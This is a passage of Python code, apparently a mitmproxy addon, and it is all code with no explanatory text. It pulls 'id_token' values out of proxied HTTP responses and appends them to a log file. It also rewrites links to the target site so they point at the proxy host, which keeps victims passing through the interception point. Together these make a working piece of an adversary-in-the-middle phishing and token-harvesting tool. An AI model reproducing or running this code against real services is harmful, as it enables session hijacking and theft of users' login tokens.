        if text:
            for token in re.findall(r'id_token=([^&"\']+)', text):
                self._save({
                    "type": "id_token",
                    "timestamp": time.time(),
                    "url": flow.request.pretty_url,
                    "token": token,
                })

            rewritten = text.replace(
                f"https://{TARGET_HOST}", f"https://{PROXY_HOST}"
            ).replace(
                f"http://{TARGET_HOST}", f"https://{PROXY_HOST}"
            )
            if rewritten != text:
                flow.response.text = rewritten

    def _is_target(self, flow: http.HTTPFlow) -> bool:
        host = flow.request.pretty_host or flow.request.host_header or ""
        return TARGET_HOST in host

    def _save(self, record: dict) -> None:
        with open(LOG_FILE, "a") as f:
            f.write(json.dumps(record) + "\n")
